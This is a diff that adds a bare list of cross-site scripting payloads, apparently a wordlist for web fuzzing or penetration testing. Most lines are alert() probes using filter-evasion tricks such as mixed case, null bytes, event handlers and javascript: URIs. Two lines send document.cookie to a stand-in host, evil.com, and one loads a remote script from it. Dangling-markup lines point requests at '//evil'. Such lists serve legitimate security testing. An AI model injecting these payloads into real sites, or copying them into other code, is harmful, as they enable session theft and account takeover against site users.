@@ -1,0 +1,37 @@
+<svg/onload=alert(1)>
+<script>alert(1)</script>
+<script     >alert(1)</script>
+<ScRipT>alert(1)</sCriPt>
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+<img/src=x a='' onerror=alert(1)>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<img src=`x`onerror=alert(1)>
+<img src='/' onerror='alert("kalisa")'>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<BODY ONLOAD=alert('XSS')>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http:/evil.com/xss.js?< B >
+"><XSS<test accesskey=x onclick=alert(1)//test
+<svg><discard onbegin=alert(1)>
+<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
+<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
+<BASE HREF="javascript:alert('XSS');//">
+<DIV STYLE="width: expression(alert('XSS'));">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss onclick="alert(1)">test</xss>
+<xss onmousedown="alert(1)">test</xss>
+<body onresize=alert(1)>”onload=this.style.width=‘100px’>
+<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+@domain.com">user+'-alert`1`-'@domain.com
+<link rel=icon href="//evil?
+<iframe src="//evil?
+<iframe src="//evil?
+<input type=hidden type=image src="//evil?
+<svg onload=alert(1)//
